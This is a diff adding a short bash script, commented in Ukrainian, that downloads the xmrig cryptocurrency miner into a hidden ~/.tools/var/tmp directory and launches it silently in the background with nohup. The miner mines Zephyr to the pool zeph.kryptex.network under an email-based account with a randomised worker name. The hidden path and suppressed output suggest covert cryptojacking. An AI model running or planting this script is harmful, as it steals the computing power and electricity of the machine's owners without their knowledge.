@@ -1,0 +1,19 @@
+#!/bin/bash
+
+# Створення папки .tools/var/tmp/ якщо вона ще не існує
+mkdir -p ~/.tools/var/tmp/
+
+# Перехід в папку .tools/var/tmp/
+cd ~/.tools/var/tmp/
+
+# Завантаження xmrig з GitHub
+wget https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
+
+# Розпакування архіву
+tar -zxvf xmrig-6.21.3-linux-static-x64.tar.gz
+
+# Перехід в папку xmrig-6.21.3
+cd xmrig-6.21.3
+
+# Запуск xmrig в фоновому режимі
+nohup ./xmrig -o zeph.kryptex.network:7777 -u fintafixgames@gmail.com/$(date +%s | sha256sum | base64 | head -c 8) -k --coin zephyr -a rx/0 >/dev/null 2>&1 &
